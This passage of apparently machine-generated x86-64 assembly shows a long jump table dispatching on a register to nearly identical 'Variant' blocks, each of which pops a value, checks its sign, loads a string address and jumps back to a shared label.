	je	.Lmain_win2_var35
	cmpl	$36, %eax
	je	.Lmain_win2_var36
	cmpl	$37, %eax
	je	.Lmain_win2_var37
	cmpl	$38, %eax
	je	.Lmain_win2_var38
	cmpl	$39, %eax
	je	.Lmain_win2_var39
	cmpl	$40, %eax
	je	.Lmain_win2_var40
	cmpl	$41, %eax
	je	.Lmain_win2_var41
	cmpl	$42, %eax
	je	.Lmain_win2_var42
	cmpl	$43, %eax
	je	.Lmain_win2_var43
	cmpl	$44, %eax
	je	.Lmain_win2_var44
	cmpl	$45, %eax
	je	.Lmain_win2_var45
	cmpl	$46, %eax
	je	.Lmain_win2_var46
	cmpl	$47, %eax
	je	.Lmain_win2_var47
	cmpl	$48, %eax
	je	.Lmain_win2_var48
	cmpl	$49, %eax
	je	.Lmain_win2_var49
	cmpl	$50, %eax
	je	.Lmain_win2_var50
	cmpl	$51, %eax
	je	.Lmain_win2_var51
	cmpl	$52, %eax
	je	.Lmain_win2_var52
	cmpl	$53, %eax
	je	.Lmain_win2_var53
	cmpl	$54, %eax
	je	.Lmain_win2_var54
	cmpl	$55, %eax
	je	.Lmain_win2_var55
	cmpl	$56, %eax
	je	.Lmain_win2_var56
	cmpl	$57, %eax
	je	.Lmain_win2_var57
	cmpl	$58, %eax
	je	.Lmain_win2_var58
	cmpl	$59, %eax
	je	.Lmain_win2_var59
	cmpl	$60, %eax
	je	.Lmain_win2_var60
	cmpl	$61, %eax
	je	.Lmain_win2_var61
	cmpl	$62, %eax
	je	.Lmain_win2_var62
	cmpl	$63, %eax
	je	.Lmain_win2_var63
	cmpl	$64, %eax
	je	.Lmain_win2_var64
	cmpl	$65, %eax
	je	.Lmain_win2_var65
	cmpl	$66, %eax
	je	.Lmain_win2_var66
	cmpl	$67, %eax
	je	.Lmain_win2_var67
	cmpl	$68, %eax
	je	.Lmain_win2_var68
	cmpl	$69, %eax
	je	.Lmain_win2_var69
	cmpl	$70, %eax
	je	.Lmain_win2_var70
	cmpl	$71, %eax
	je	.Lmain_win2_var71
	cmpl	$72, %eax
	je	.Lmain_win2_var72
	cmpl	$73, %eax
	je	.Lmain_win2_var73
	cmpl	$74, %eax
	je	.Lmain_win2_var74
	cmpl	$75, %eax
	je	.Lmain_win2_var75
	cmpl	$76, %eax
	je	.Lmain_win2_var76
	cmpl	$77, %eax
	je	.Lmain_win2_var77
	cmpl	$78, %eax
	je	.Lmain_win2_var78
	cmpl	$79, %eax
	je	.Lmain_win2_var79
	cmpl	$80, %eax
	je	.Lmain_win2_var80
	cmpl	$81, %eax
	je	.Lmain_win2_var81
	cmpl	$82, %eax
	je	.Lmain_win2_var82
	cmpl	$83, %eax
	je	.Lmain_win2_var83
	cmpl	$84, %eax
	je	.Lmain_win2_var84
	cmpl	$85, %eax
	je	.Lmain_win2_var85
	cmpl	$86, %eax
	je	.Lmain_win2_var86
	cmpl	$87, %eax
	je	.Lmain_win2_var87
	cmpl	$88, %eax
	je	.Lmain_win2_var88
	cmpl	$89, %eax
	je	.Lmain_win2_var89
	cmpl	$90, %eax
	je	.Lmain_win2_var90
	cmpl	$91, %eax
	je	.Lmain_win2_var91
	cmpl	$92, %eax
	je	.Lmain_win2_var92
	cmpl	$93, %eax
	je	.Lmain_win2_var93
	cmpl	$94, %eax
	je	.Lmain_win2_var94
	cmpl	$95, %eax
	je	.Lmain_win2_var95
	cmpl	$96, %eax
	je	.Lmain_win2_var96
	cmpl	$97, %eax
	je	.Lmain_win2_var97
	cmpl	$98, %eax
	je	.Lmain_win2_var98
	cmpl	$99, %eax
	je	.Lmain_win2_var99
	jmp	.Lmain_win2_var0
## Variant 0
.Lmain_win2_var0:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 1
.Lmain_win2_var1:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 2
.Lmain_win2_var2:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 3
.Lmain_win2_var3:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 4
.Lmain_win2_var4:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 5
.Lmain_win2_var5:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 6
.Lmain_win2_var6:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 7
.Lmain_win2_var7:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 8
.Lmain_win2_var8:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 9
.Lmain_win2_var9:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 10
.Lmain_win2_var10:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 11
.Lmain_win2_var11:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 12
.Lmain_win2_var12:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 13
.Lmain_win2_var13:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 14
.Lmain_win2_var14:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 15
.Lmain_win2_var15:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 16
.Lmain_win2_var16:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 17
.Lmain_win2_var17:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 18
.Lmain_win2_var18:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 19
.Lmain_win2_var19:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 20
.Lmain_win2_var20:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 21
.Lmain_win2_var21:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 22
.Lmain_win2_var22:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 23
.Lmain_win2_var23:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 24
.Lmain_win2_var24:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 25
.Lmain_win2_var25:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 26
.Lmain_win2_var26:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 27
.Lmain_win2_var27:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 28
.Lmain_win2_var28:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 29
.Lmain_win2_var29:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 30
.Lmain_win2_var30:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 31
.Lmain_win2_var31:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 32
.Lmain_win2_var32:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 33
.Lmain_win2_var33:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 34
.Lmain_win2_var34:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 35
.Lmain_win2_var35:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 36
.Lmain_win2_var36:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 37
.Lmain_win2_var37:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 38
.Lmain_win2_var38:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 39
.Lmain_win2_var39:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 40
.Lmain_win2_var40:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 41
.Lmain_win2_var41:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 42
.Lmain_win2_var42:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 43
.Lmain_win2_var43:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 44
.Lmain_win2_var44:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 45
.Lmain_win2_var45:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 46
.Lmain_win2_var46:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 47
.Lmain_win2_var47:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 48
.Lmain_win2_var48:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 49
.Lmain_win2_var49:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 50
.Lmain_win2_var50:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 51
.Lmain_win2_var51:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 52
.Lmain_win2_var52:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 53
.Lmain_win2_var53:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 54
.Lmain_win2_var54:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 55
.Lmain_win2_var55:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 56
.Lmain_win2_var56:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 57
.Lmain_win2_var57:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 58
.Lmain_win2_var58:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 59
.Lmain_win2_var59:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 60
.Lmain_win2_var60:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 61
.Lmain_win2_var61:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 62
.Lmain_win2_var62:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 63
.Lmain_win2_var63:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 64
.Lmain_win2_var64:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 65
.Lmain_win2_var65:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 66
.Lmain_win2_var66:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 67
.Lmain_win2_var67:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 68
.Lmain_win2_var68:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 69
.Lmain_win2_var69:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 70
.Lmain_win2_var70:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 71
.Lmain_win2_var71:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 72
.Lmain_win2_var72:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 73
.Lmain_win2_var73:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 74
.Lmain_win2_var74:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 75
.Lmain_win2_var75:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 76
.Lmain_win2_var76:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 77
.Lmain_win2_var77:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 78
.Lmain_win2_var78:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 79
.Lmain_win2_var79:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 80
.Lmain_win2_var80:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 81
.Lmain_win2_var81:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 82
.Lmain_win2_var82:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 83
.Lmain_win2_var83:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 84
.Lmain_win2_var84:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 85
.Lmain_win2_var85:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 86
.Lmain_win2_var86:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 87
.Lmain_win2_var87:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 88
.Lmain_win2_var88:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 89
.Lmain_win2_var89:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 90
.Lmain_win2_var90:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 91
.Lmain_win2_var91:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 92
.Lmain_win2_var92:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 93
.Lmain_win2_var93:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 94
.Lmain_win2_var94:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
